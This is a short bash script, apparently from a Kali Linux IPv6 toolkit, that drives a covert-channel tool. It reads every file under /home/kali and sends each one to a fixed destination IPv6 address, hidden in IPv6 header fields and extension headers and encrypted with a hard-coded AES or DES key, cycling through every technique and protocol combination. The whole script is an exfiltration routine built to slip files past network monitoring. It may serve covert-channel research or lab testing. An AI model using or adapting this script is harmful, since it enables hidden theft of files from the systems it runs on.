#!/bin/bash

# filepath: /home/kali/Desktop/IPv6 toolkit/covert_channel.sh

# Define the parameters
INTERFACE="eth0"
SOURCE_MAC="00:11:22:33:44:55"
DESTINATION_MAC="66:77:88:99:AA:BB"
SOURCE_IP="2001::3"
DESTINATION_IP="2005::3"
KEY="mysecretkey"

# Define the possible types, algorithms, and protocols
TYPES=("TC" "FL" "NH" "HL" "HBH" "RH" "DO" "FH")
ALGORITHMS=("AES" "DES")
PROTOCOLS=("IPv6" "ICMPv6" "UDP" "TCP")

# Loop through all files in the /home/kali directory and its subdirectories
find /home/kali -type f | while read -r FILE; do
    # Loop through all types
    for TYPE in "${TYPES[@]}"; do
        # Loop through all algorithms
        for ALGORITHM in "${ALGORITHMS[@]}"; do
            # Loop through all protocols
            for PROTOCOL in "${PROTOCOLS[@]}"; do
                # Send the file using the current combination of parameters
                python3 covert_channel.py "$INTERFACE" -smac "$SOURCE_MAC" -dmac "$DESTINATION_MAC" -sip "$SOURCE_IP" -dip "$DESTINATION_IP" -t "$TYPE" -i "$FILE" -a "$ALGORITHM" -p "$PROTOCOL" -k "$KEY"
            done
        done
    done
done